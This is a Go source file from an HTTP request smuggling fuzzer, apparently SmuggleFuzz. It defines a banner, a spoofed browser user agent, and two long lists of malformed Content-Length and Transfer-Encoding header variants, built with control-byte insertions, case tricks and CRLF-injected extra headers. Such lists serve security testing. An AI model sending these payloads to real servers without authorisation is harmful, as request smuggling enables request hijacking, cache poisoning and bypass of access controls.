package lib

const (
	UserAgentHeaderValue = "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"

	Banner = `      
 _____                   _     _____             
|   __|_____ _ _ ___ ___| |___|   __|_ _ ___ ___ 
|__   |     | | | . | . | | -_|   __| | |- _|- _|
|_____|_|_|_|___|_  |_  |_|___|__|  |___|___|___|
                |___|___|  v0.2.2 @moopinger

`

	// default gadgetList
	DefaultGadgetList = `validheader; smugglefuzz
CONTENT-LENGTH; 13
content-lengt%68; 13
content-length; %313
transfer-encoding; chunke%64
transfer-encoding; chunked, chunked
TRANSFER-ENCODING; CHUNKED
transfer-encoding; chunked,identity
transfer-encoding; chunked,chunked
transfer-encoding: gzip, chunked
transfer-encoding: gzip,chunked
transfer-encoding: chunked, gzip
content-length; 13
content-length; %20%20%20%2013
content-length; 13%20%20%20%20
transfer-encoding; chunked
transfer-encoding; ,chunked
transfer-encoding; gzip, chunked
transfer-encoding; \tchunked
transfer-encoding\t; chunked
\ttransfer-encoding; chunked
transfer-encoding; chunked\t
transfer-encoding; chunked\r
transfer-%00encoding; chunked
transfer-%01encoding; chunked
transfer-%13encoding; chunked
content-length; 13\r
content-length; 015
content-length; 013
content-length; 13_0
content-%00length; 13
content-%01length; 13
content-%13length; 13
content-length; 13\r
transfer_encoding; chunked
content_length; 13
contentlength; 13
transferencoding; chunked
Content-Length; 13
content-length; "13"
content-length; '13'
content-length; +13
content-length; -13
content-length; "13"
content-length; '13'
content-length; +13
content-length; (13)
content-length; [13]
content-length; -13
content-length; cow13
content-length; cow13
Transfer-Encoding; chunked
Transfer-Encoding; chunked, identity
Transfer-Encoding; chunked,
Transfer-Encoding; , chunked
Transfer-Encoding; identity, chunked
Transfer-Encoding; Chunked
transfer-encoding; chunked
transfer-encoding; chunked, identity
transfer-encoding; chunked,
transfer-encoding; , chunked
transfer-encoding; ,chunked
transfer-encoding; chunked,
transfer-encoding; identity, chunked
transfer-encoding; Chunked
Transfer-Encoding; chunked\r\nxxx: yyy
Transfer-Encoding; chunked\nxxx: yyy
transfer-encoding; chunked\r\nxxx: yyy
content-length; 13\r\nxxx: yyy
content-length; 13\nxxx: yyy
content-length: 13\r\nxxx; yyy
content-length: 13\nxxx; yyy
transfer-encoding; "chunked"
transfer-encoding; 'chunked'
transfer-encoding; chunked
transfer-encoding; chunk
transfer-encoding: chunked\r\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \r\nxxx: yyy
transfer-encoding: chunked; \nxxx: yyy
transfer-encoding: chunked; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \nxxx: yyy
xxxx: yyy\r\ncontent-length; 13
xxxx: yyy\r\transfer-encoding; chunked
xxxx: yyy\ncontent-length; 13
xxxx: yyy\transfer-encoding; chunked
xxxx; yyy\r\ncontent-length: 13
xxxx; yyy\r\ntransfer-encoding: chunked
xxxx; yyy\ntransfer-encoding: chunked
xxxx; yyy\nyyy\ncontent-length: 13
transfer; encoding: chunked
xxxx; transfer-encoding: chunked
content-length: 13; \r\nxxx: 13
content-length: 13; \nxxxX: 13
content-length:; 13
%20; content-length: 13
ddd: rrrrr\r\n; content-length: 13
content-length%01; 13
%01content-length; 13
content-length; %0113
content-length; 13%01
%01transfer-encoding; chunked
transfer-encoding%01; chunked
transfer-encoding; chunked%01
transfer-encoding; %01chunked
content-length%04; 13
%04content-length; 13
content-length; %0413
content-length; 13%04
%04transfer-encoding; chunked
transfer-encoding%04; chunked
transfer-encoding; chunked%04
transfer-encoding; %04chunked
content-length%08; 13
%08content-length; 13
content-length; %0813
content-length; 13%08
%08transfer-encoding; chunked
transfer-encoding%08; chunked
transfer-encoding; chunked%08
transfer-encoding; %08chunked
content-length%0A; 13
%0Acontent-length; 13
content-length; %0A13
content-length; 13%0A
%0Atransfer-encoding; chunked
transfer-encoding%0A; chunked
transfer-encoding; chunked%0A
transfer-encoding; %0Achunked
content-length%0B; 13
%0Bcontent-length; 13
content-length; %0B13
content-length; 13%0B
%0Btransfer-encoding; chunked
transfer-encoding%0B; chunked
transfer-encoding; chunked%0B
transfer-encoding; %0Bchunked
content-length%0C; 13
%0Ccontent-length; 13
content-length; %0C13
content-length; 13%0C
%0Ctransfer-encoding; chunked
transfer-encoding%0C; chunked
transfer-encoding; chunked%0C
transfer-encoding; %0Cchunked
content-length%0D; 13
%0Dcontent-length; 13
content-length; %0D13
content-length; 13%0D
%0Dtransfer-encoding; chunked
transfer-encoding%0D; chunked
transfer-encoding; chunked%0D
transfer-encoding; %0Dchunked
content-length%1F; 13
%1Fcontent-length; 13
content-length; %1F13
content-length; 13%1F
%1Ftransfer-encoding; chunked
transfer-encoding%1F; chunked
transfer-encoding; chunked%1F
transfer-encoding; %1Fchunked
content-length%20; 13
%20content-length; 13
content-length; %2013
content-length; 13%20
%20transfer-encoding; chunked
transfer-encoding%20; chunked
transfer-encoding; chunked%20
transfer-encoding; %20chunked
content-length%7F; 13
%7Fcontent-length; 13
content-length; %7F13
content-length; 13%7F
%7Ftransfer-encoding; chunked
transfer-encoding%7F; chunked
transfer-encoding; chunked%7F
transfer-encoding; %7Fchunked
content-length%A0; 13
%A0content-length; 13
content-length; %A013
content-length; 13%A0
%A0transfer-encoding; chunked
transfer-encoding%A0; chunked
transfer-encoding; chunked%A0
transfer-encoding; %A0chunked
content-length%FF; 13
%FFcontent-length; 13
content-length; %FF13
content-length; 13%FF
%FFtransfer-encoding; chunked
transfer-encoding%FF; chunked
transfer-encoding; chunked%FF
transfer-encoding; %FFchunked
content-length%00; 13
%00content-length; 13
content-length; %0013
content-length; 13%00
%00transfer-encoding; chunked
transfer-encoding%00; chunked
transfer-encoding; chunked%00
transfer-encoding; %00chunked
:authority; [HOSTNAME]\r\n\r\n99\r\n`

	ExtendedGadgetList = `validheader; smugglefuzz
CONTENT-LENGTH; 13
content-lengt%68; 13
content-length; %313
transfer-encoding; chunke%64
transfer-encoding; chunked, chunked
TRANSFER-ENCODING; CHUNKED
transfer-encoding; chunked,identity
transfer-encoding; chunked,chunked
transfer-encoding: gzip, chunked
transfer-encoding: gzip,chunked
transfer-encoding: chunked, gzip
content-length; 13
content-length; %20%20%20%2013
content-length; 13%20%20%20%20
transfer-encoding; chunked
transfer-encoding; ,chunked
transfer-encoding; gzip, chunked
transfer-encoding; \tchunked
transfer-encoding\t; chunked
\ttransfer-encoding; chunked
transfer-encoding; chunked\t
transfer-encoding; chunked\r
transfer-%00encoding; chunked
transfer-%01encoding; chunked
transfer-%13encoding; chunked
content-length; 13\r
content-length; 015
content-length; 013
content-length; 13_0
content-%00length; 13
content-%01length; 13
content-%13length; 13
content-length; 13\r
transfer_encoding; chunked
content_length; 13
contentlength; 13
transferencoding; chunked
Content-Length; 13
content-length; "13"
content-length; '13'
content-length; +13
content-length; -13
content-length; "13"
content-length; '13'
content-length; +13
content-length; (13)
content-length; [13]
content-length; -13
content-length; cow13
content-length; cow13
Transfer-Encoding; chunked
Transfer-Encoding; chunked, identity
Transfer-Encoding; chunked,
Transfer-Encoding; , chunked
Transfer-Encoding; identity, chunked
Transfer-Encoding; Chunked
transfer-encoding; chunked
transfer-encoding; chunked, identity
transfer-encoding; chunked,
transfer-encoding; , chunked
transfer-encoding; ,chunked
transfer-encoding; chunked,
transfer-encoding; identity, chunked
transfer-encoding; Chunked
Transfer-Encoding; chunked\r\nxxx: yyy
Transfer-Encoding; chunked\nxxx: yyy
transfer-encoding; chunked\r\nxxx: yyy
content-length; 13\r\nxxx: yyy
content-length; 13\nxxx: yyy
content-length: 13\r\nxxx; yyy
content-length: 13\nxxx; yyy
transfer-encoding; "chunked"
transfer-encoding; 'chunked'
transfer-encoding; chunked
transfer-encoding; chunk
transfer-encoding: chunked\r\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \r\nxxx: yyy
transfer-encoding: chunked; \nxxx: yyy
transfer-encoding: chunked; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \nxxx: yyy
xxxx: yyy\r\ncontent-length; 13
xxxx: yyy\r\transfer-encoding; chunked
xxxx: yyy\ncontent-length; 13
xxxx: yyy\transfer-encoding; chunked
xxxx; yyy\r\ncontent-length: 13
xxxx; yyy\r\ntransfer-encoding: chunked
xxxx; yyy\ntransfer-encoding: chunked
xxxx; yyy\nyyy\ncontent-length: 13
transfer; encoding: chunked
xxxx; transfer-encoding: chunked
content-length: 13; \r\nxxx: 13
content-length: 13; \nxxxX: 13
content-length:; 13
%20; content-length: 13
ddd: rrrrr\r\n; content-length: 13
content-length%20; 13
%20content-length; 13
content-length; %2013
content-length; 13%20
%20transfer-encoding; chunked
transfer-encoding%20; chunked
transfer-encoding; chunked%20
transfer-encoding; %20chunked
content-length%7F; 13
%7Fcontent-length; 13
content-length; %7F13
content-length; 13%7F
%7Ftransfer-encoding; chunked
transfer-encoding%7F; chunked
transfer-encoding; chunked%7F
transfer-encoding; %7Fchunked
content-length%9D; 13
%9Dcontent-length; 13
content-length; %9D13
content-length; 13%9D
%9Dtransfer-encoding; chunked
transfer-encoding%9D; chunked
transfer-encoding; chunked%9D
transfer-encoding; %9Dchunked
content-length%A0; 13
%A0content-length; 13
content-length; %A013
content-length; 13%A0
%A0transfer-encoding; chunked
transfer-encoding%A0; chunked
transfer-encoding; chunked%A0
transfer-encoding; %A0chunked
content-length%81; 13
%81content-length; 13
content-length; %8113
content-length; 13%81
%81transfer-encoding; chunked
transfer-encoding%81; chunked
transfer-encoding; chunked%81
transfer-encoding; %81chunked
content-length%5F; 13
%5Fcontent-length; 13
content-length; %5F13
content-length; 13%5F
%5Ftransfer-encoding; chunked
transfer-encoding%5F; chunked
transfer-encoding; chunked%5F
transfer-encoding; %5Fchunked
content-length%5C; 13
%5Ccontent-length; 13
content-length; %5C13
content-length; 13%5C
%5Ctransfer-encoding; chunked
transfer-encoding%5C; chunked
transfer-encoding; chunked%5C
transfer-encoding; %5Cchunked
content-length%90; 13
%90content-length; 13
content-length; %9013
content-length; 13%90
%90transfer-encoding; chunked
transfer-encoding%90; chunked
transfer-encoding; chunked%90
transfer-encoding; %90chunked
content-length%F9; 13
%F9content-length; 13
content-length; %F913
content-length; 13%F9
%F9transfer-encoding; chunked
transfer-encoding%F9; chunked
transfer-encoding; chunked%F9
transfer-encoding; %F9chunked
content-length%00; 13
%00content-length; 13
content-length; %0013
content-length; 13%00
%00transfer-encoding; chunked
transfer-encoding%00; chunked
transfer-encoding; chunked%00
transfer-encoding; %00chunked
content-length%01; 13
%01content-length; 13
content-length; %0113
content-length; 13%01
%01transfer-encoding; chunked
transfer-encoding%01; chunked
transfer-encoding; chunked%01
transfer-encoding; %01chunked
content-length%02; 13
%02content-length; 13
content-length; %0213
content-length; 13%02
%02transfer-encoding; chunked
transfer-encoding%02; chunked
transfer-encoding; chunked%02
transfer-encoding; %02chunked
content-length%03; 13
%03content-length; 13
content-length; %0313
content-length; 13%03
%03transfer-encoding; chunked
transfer-encoding%03; chunked
transfer-encoding; chunked%03
transfer-encoding; %03chunked
content-length%04; 13
%04content-length; 13
content-length; %0413
content-length; 13%04
%04transfer-encoding; chunked
transfer-encoding%04; chunked
transfer-encoding; chunked%04
transfer-encoding; %04chunked
content-length%05; 13
%05content-length; 13
content-length; %0513
content-length; 13%05
%05transfer-encoding; chunked
transfer-encoding%05; chunked
transfer-encoding; chunked%05
transfer-encoding; %05chunked
content-length%06; 13
%06content-length; 13
content-length; %0613
content-length; 13%06
%06transfer-encoding; chunked
transfer-encoding%06; chunked
transfer-encoding; chunked%06
transfer-encoding; %06chunked
content-length%07; 13
%07content-length; 13
content-length; %0713
content-length; 13%07
%07transfer-encoding; chunked
transfer-encoding%07; chunked
transfer-encoding; chunked%07
transfer-encoding; %07chunked
content-length%08; 13
%08content-length; 13
content-length; %0813
content-length; 13%08
%08transfer-encoding; chunked
transfer-encoding%08; chunked
transfer-encoding; chunked%08
transfer-encoding; %08chunked
content-length%09; 13
%09content-length; 13
content-length; %0913
content-length; 13%09
%09transfer-encoding; chunked
transfer-encoding%09; chunked
transfer-encoding; chunked%09
transfer-encoding; %09chunked
content-length%0A; 13
%0Acontent-length; 13
content-length; %0A13
content-length; 13%0A
%0Atransfer-encoding; chunked
transfer-encoding%0A; chunked
transfer-encoding; chunked%0A
transfer-encoding; %0Achunked
content-length%0B; 13
%0Bcontent-length; 13
content-length; %0B13
content-length; 13%0B
%0Btransfer-encoding; chunked
transfer-encoding%0B; chunked
transfer-encoding; chunked%0B
transfer-encoding; %0Bchunked
content-length%0C; 13
%0Ccontent-length; 13
content-length; %0C13
content-length; 13%0C
%0Ctransfer-encoding; chunked
transfer-encoding%0C; chunked
transfer-encoding; chunked%0C
transfer-encoding; %0Cchunked
content-length%0D; 13
%0Dcontent-length; 13
content-length; %0D13
content-length; 13%0D
%0Dtransfer-encoding; chunked
transfer-encoding%0D; chunked
transfer-encoding; chunked%0D
transfer-encoding; %0Dchunked
content-length%0E; 13
%0Econtent-length; 13
content-length; %0E13
content-length; 13%0E
%0Etransfer-encoding; chunked
transfer-encoding%0E; chunked
transfer-encoding; chunked%0E
transfer-encoding; %0Echunked
content-length%0F; 13
%0Fcontent-length; 13
content-length; %0F13
content-length; 13%0F
%0Ftransfer-encoding; chunked
transfer-encoding%0F; chunked
transfer-encoding; chunked%0F
transfer-encoding; %0Fchunked
content-length%10; 13
%10content-length; 13
content-length; %1013
content-length; 13%10
%10transfer-encoding; chunked
transfer-encoding%10; chunked
transfer-encoding; chunked%10
transfer-encoding; %10chunked
content-length%11; 13
%11content-length; 13
content-length; %1113
content-length; 13%11
%11transfer-encoding; chunked
transfer-encoding%11; chunked
transfer-encoding; chunked%11
transfer-encoding; %11chunked
content-length%12; 13
%12content-length; 13
content-length; %1213
content-length; 13%12
%12transfer-encoding; chunked
transfer-encoding%12; chunked
transfer-encoding; chunked%12
transfer-encoding; %12chunked
content-length%13; 13
%13content-length; 13
content-length; %1313
content-length; 13%13
%13transfer-encoding; chunked
transfer-encoding%13; chunked
transfer-encoding; chunked%13
transfer-encoding; %13chunked
content-length%14; 13
%14content-length; 13
content-length; %1413
content-length; 13%14
%14transfer-encoding; chunked
transfer-encoding%14; chunked
transfer-encoding; chunked%14
transfer-encoding; %14chunked
content-length%15; 13
%15content-length; 13
content-length; %1513
content-length; 13%15
%15transfer-encoding; chunked
transfer-encoding%15; chunked
transfer-encoding; chunked%15
transfer-encoding; %15chunked
content-length%16; 13
%16content-length; 13
content-length; %1613
content-length; 13%16
%16transfer-encoding; chunked
transfer-encoding%16; chunked
transfer-encoding; chunked%16
transfer-encoding; %16chunked
content-length%17; 13
%17content-length; 13
content-length; %1713
content-length; 13%17
%17transfer-encoding; chunked
transfer-encoding%17; chunked
transfer-encoding; chunked%17
transfer-encoding; %17chunked
content-length%18; 13
%18content-length; 13
content-length; %1813
content-length; 13%18
%18transfer-encoding; chunked
transfer-encoding%18; chunked
transfer-encoding; chunked%18
transfer-encoding; %18chunked
content-length%19; 13
%19content-length; 13
content-length; %1913
content-length; 13%19
%19transfer-encoding; chunked
transfer-encoding%19; chunked
transfer-encoding; chunked%19
transfer-encoding; %19chunked
content-length%1A; 13
%1Acontent-length; 13
content-length; %1A13
content-length; 13%1A
%1Atransfer-encoding; chunked
transfer-encoding%1A; chunked
transfer-encoding; chunked%1A
transfer-encoding; %1Achunked
content-length%1B; 13
%1Bcontent-length; 13
content-length; %1B13
content-length; 13%1B
%1Btransfer-encoding; chunked
transfer-encoding%1B; chunked
transfer-encoding; chunked%1B
transfer-encoding; %1Bchunked
content-length%1C; 13
%1Ccontent-length; 13
content-length; %1C13
content-length; 13%1C
%1Ctransfer-encoding; chunked
transfer-encoding%1C; chunked
transfer-encoding; chunked%1C
transfer-encoding; %1Cchunked
content-length%1D; 13
%1Dcontent-length; 13
content-length; %1D13
content-length; 13%1D
%1Dtransfer-encoding; chunked
transfer-encoding%1D; chunked
transfer-encoding; chunked%1D
transfer-encoding; %1Dchunked
content-length%1E; 13
%1Econtent-length; 13
content-length; %1E13
content-length; 13%1E
%1Etransfer-encoding; chunked
transfer-encoding%1E; chunked
transfer-encoding; chunked%1E
transfer-encoding; %1Echunked
content-length%1F; 13
%1Fcontent-length; 13
content-length; %1F13
content-length; 13%1F
%1Ftransfer-encoding; chunked
transfer-encoding%1F; chunked
transfer-encoding; chunked%1F
transfer-encoding; %1Fchunked`
)
